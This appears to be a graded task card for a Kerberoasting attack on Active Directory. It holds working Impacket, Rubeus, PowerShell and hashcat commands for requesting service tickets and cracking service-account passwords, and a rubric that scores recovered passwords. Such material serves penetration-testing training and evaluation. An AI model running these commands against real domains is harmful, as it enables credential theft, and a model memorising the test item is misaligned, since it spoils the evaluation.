# FOX-AD-001: Kerberoasting

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-AD-001 |
| **Domain** | Active Directory |
| **MITRE** | T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting) |
| **Difficulty** | Easy |
| **Prerequisites** | Valid domain credentials (any user) |

## Methodology
1. **Discovery**: Find SPN-linked accounts via BloodHound or `setspn -T <domain> -Q */*`
2. **Impacket** (Remote):
   ```bash
   impacket-GetUserSPNs <domain>/<user>:<password> -request -outputfile kerberoast.txt
   ```
3. **Rubeus** (On-host Windows with creds):
   ```cmd
   Rubeus.exe kerberoast /nowrap > kerberoast.txt
   ```
4. **PowerShell** (On-host):
   ```powershell
   Add-Type -AssemblyName System.IdentityModel
   setspn -T <domain> -Q */* | Select-String '^CN' | ForEach-Object { 
     $spn = $_ -replace '^CN=(.*?),.*', '$1'
     $ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($spn)
     Write-Output "$spn : $($ticket.Id)"
   }
   ```
5. **Crack**:
   ```bash
   hashcat -m 13100 kerberoast.txt rockyou.txt --force
   ```
6. **Targeted Kerberoasting**: Set SPN on a user you control with `Set-DomainObject` (PowerView) then kerberoast that user

## Keywords
`active-directory-kerberos-attacks`, `Kerberoasting`, `SPN`, `GetUserSPNs`, `Rubeus`, `hashcat -m 13100`, `service ticket`, `crack kerberos`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| SPN discovery (found kerberoastable users) | 20 |
| TGS ticket successfully requested | 30 |
| Hash format identified (RC4/AES) | 15 |
| Hash cracking attempted | 20 |
| Service account password recovered | 15 |
| **Total** | **100** |
